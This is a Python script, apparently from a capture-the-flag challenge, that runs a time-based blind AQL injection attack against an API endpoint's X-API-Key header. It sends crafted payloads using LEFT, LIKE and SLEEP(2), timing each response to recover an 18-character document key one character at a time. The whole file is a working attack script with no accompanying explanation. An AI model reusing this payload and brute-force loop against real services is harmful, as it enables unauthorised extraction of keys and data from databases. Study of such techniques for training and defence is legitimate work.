import requests
import string
import time

# URL and headers
url = "https://api.frostbit.app/api/v1/frostbitadmin/bot/a0870d85-09c6-440a-b878-f7cc8253bf24/deactivate?debug=true"
header_name = "X-API-Key"

# Function to make the request and check for delay
def make_request(payload):
    headers = {header_name: payload}
    start_time = time.time()
    
    # Send GET request
    response = requests.get(url, headers=headers)
    
    # Measure the time taken for the request
    end_time = time.time()
    duration = end_time - start_time
    
    # If response takes longer than expected, return True to indicate a successful match
    return duration > 2  # Adjust the threshold time if necessary

# Function to find the correct character for a given position
def find_character(position, known_part):
    # Define all possible characters (letters, digits, and allowed special characters)
    possible_characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + "!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~"
    
    # Exclude forbidden characters
    forbidden_characters = [';', '*', '/', '\\', '`', '%']
    possible_characters = ''.join([ch for ch in possible_characters if ch not in forbidden_characters])
    
    for char in possible_characters:
        # Create the payload with the correct injection structure, including single quotes
        payload = f"' OR LEFT((ATTRIBUTES(doc)[0]),18) LIKE '{known_part + char}%' ? SLEEP(2) : '"
        
        #print(f"Testing {position + 1}-th character: {char}")
        
        if make_request(payload):
            print(f"Found character at position {position + 1}: {known_part}")
            return char
    return None

# Function to iterate through each character position of the _key
def brute_force_key(length=18):
    known_part = ""
    for i in range(length):
        found_char = find_character(i, known_part)
        if found_char:
            known_part += found_char
        else:
            print(f"Failed to find character at position {i + 1}.")
            break
    return known_part

# Main execution
if __name__ == "__main__":
    print("Starting brute force attack to find key using Blind AQL Injection...")
    found_key = brute_force_key()
    if found_key:
        print(f"Found _key: {found_key}")
    else:
        print("Failed to brute force _key.")
